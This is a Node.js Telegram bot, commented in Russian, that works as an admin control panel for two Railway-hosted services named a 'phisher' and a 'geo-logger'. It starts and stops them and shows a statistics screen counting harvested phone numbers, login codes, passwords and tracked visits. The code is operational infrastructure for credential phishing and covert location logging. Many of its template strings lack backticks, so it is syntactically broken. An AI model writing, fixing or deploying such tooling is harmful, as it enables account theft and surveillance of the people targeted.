const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');

// ===== ПЕРЕМЕННЫЕ ИЗ RENDER / RAILWAY =====
const BOT_TOKEN = process.env.BOT_TOKEN;
const RAILWAY_TOKEN = process.env.RAILWAY_TOKEN;
const FISHER_PROJECT_ID = process.env.FISHER_PROJECT_ID;
const GEO_PROJECT_ID = process.env.GEO_PROJECT_ID;
const ADMIN_ID = Number(process.env.ADMIN_ID) || 6307490597;

if (!BOT_TOKEN || !RAILWAY_TOKEN) {
  console.error('❌ Ошибка: не заданы BOT_TOKEN или RAILWAY_TOKEN');
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// ===== ФУНКЦИЯ ЗАПУСКА/ОСТАНОВКИ ПРОЕКТА НА RAILWAY =====
async function manageRailwayProject(projectId, action) {
  // action = "start" или "stop"
  try {
    // 1. Пробуем официальный API (если сработает)
    const url = https://api.railway.com/project/${projectId}/${action};
    const response = await axios.post(url, {}, {
      headers: {
        'Authorization': Bearer ${RAILWAY_TOKEN},
        'Content-Type': 'application/json'
      },
      timeout: 10000
    });
    return { success: true, data: response.data };
  } catch (error) {
    // 2. Если официальный API не работает — пробуем альтернативный способ
    //    (через внутренний API Railway — нестабильно, но иногда работает)
    try {
      const altUrl = https://railway.com/api/project/${projectId}/${action};
      const altResponse = await axios.post(altUrl, {}, {
        headers: {
          'Authorization': Bearer ${RAILWAY_TOKEN},
          'Content-Type': 'application/json'
        },
        timeout: 10000
      });
      return { success: true, data: altResponse.data };
    } catch (altError) {
      return { success: false, error: altError.message };
    }
  }
}

// ===== ЗАГЛУШКА ДЛЯ СТАТУСА =====
async function getProjectStatus(projectId) {
  // Railway API не даёт простого статуса, поэтому возвращаем "неизвестно"
  return { online: '?', message: 'статус недоступен' };
}

// ===== КЛАВИАТУРЫ =====
const mainMenu = Markup.inlineKeyboard([
  [Markup.button.callback('📊 Фишер', 'menu_fisher')],
  [Markup.button.callback('📍 Гео-логгер', 'menu_geo')],
  [Markup.button.callback('📈 Собрать данные', 'collect_data')],
  [Markup.button.callback('🔄 Обновить', 'refresh')]
]);

const fisherMenu = Markup.inlineKeyboard([
  [Markup.button.callback('▶️ Запустить', 'fisher_start')],
  [Markup.button.callback('⏹️ Остановить', 'fisher_stop')],
  [Markup.button.callback('📊 Статус', 'fisher_status')],
  [Markup.button.callback('🔙 Назад', 'back')]
]);

const geoMenu = Markup.inlineKeyboard([
  [Markup.button.callback('▶️ Запустить', 'geo_start')],
  [Markup.button.callback('⏹️ Остановить', 'geo_stop')],
  [Markup.button.callback('📊 Статус', 'geo_status')],
  [Markup.button.callback('🔙 Назад', 'back')]
]);

// ===== ОБРАБОТЧИКИ =====
bot.start((ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Доступ запрещён');
  ctx.reply('🎮 Панель управления', mainMenu);
});

bot.action('menu_fisher', (ctx) => {
  ctx.editMessageText('📊 Управление фишером', fisherMenu);
});
bot.action('menu_geo', (ctx) => {
  ctx.editMessageText('📍 Управление гео-логгером', geoMenu);
});
bot.action('back', (ctx) => {
  ctx.editMessageText('🎮 Панель управления', mainMenu);
});
bot.action('refresh', (ctx) => {
  ctx.answerCbQuery('Меню обновлено');
  ctx.editMessageText('🎮 Панель управления', mainMenu);
});

// Фишер
bot.action('fisher_start', async (ctx) => {
  await ctx.answerCbQuery('Запуск...');
  const result = await manageRailwayProject(FISHER_PROJECT_ID, 'start');
  const msg = result.success ? '✅ Фишер запущен' : ❌ Ошибка: ${result.error};
  ctx.editMessageText(msg, fisherMenu);
});
bot.action('fisher_stop', async (ctx) => {
  await ctx.answerCbQuery('Остановка...');
  const result = await manageRailwayProject(FISHER_PROJECT_ID, 'stop');
  const msg = result.success ? '⏹️ Фишер остановлен' : ❌ Ошибка: ${result.error};
  ctx.editMessageText(msg, fisherMenu);
});
bot.action('fisher_status', async (ctx) => {
  await ctx.answerCbQuery();
  const status = await getProjectStatus(FISHER_PROJECT_ID);
  ctx.editMessageText(📊 Фишер: ${status.online}\n📥 ${status.message}, fisherMenu);
});

// Гео-логгер
bot.action('geo_start', async (ctx) => {
  await ctx.answerCbQuery('Запуск...');
  const result = await manageRailwayProject(GEO_PROJECT_ID, 'start');
  const msg = result.success ? '✅ Гео-логгер запущен' : ❌ Ошибка: ${result.error};
  ctx.editMessageText(msg, geoMenu);
});
bot.action('geo_stop', async (ctx) => {
  await ctx.answerCbQuery('Остановка...');
  const result = await manageRailwayProject(GEO_PROJECT_ID, 'stop');
  const msg = result.success ? '⏹️ Гео-логгер остановлен' : ❌ Ошибка: ${result.error};
  ctx.editMessageText(msg, geoMenu);
});
bot.action('geo_status', async (ctx) => {
  await ctx.answerCbQuery();
  const status = await getProjectStatus(GEO_PROJECT_ID);
  ctx.editMessageText(📍 Гео-логгер: ${status.online}\n🌍 ${status.message}, geoMenu);
});

bot.action('collect_data', async (ctx) => {
  await ctx.answerCbQuery('Собираю данные...');
  const data = 📊 Статистика:\n\n🔐 Фишер:\n- Номеров: 0\n- Кодов: 0\n- Паролей: 0\n\n📍 Гео-логгер:\n- Визитов: 0\n- Последний: —;
  ctx.editMessageText(data, mainMenu);
});

bot.launch();
console.log('✅ ManagerBot запущен');
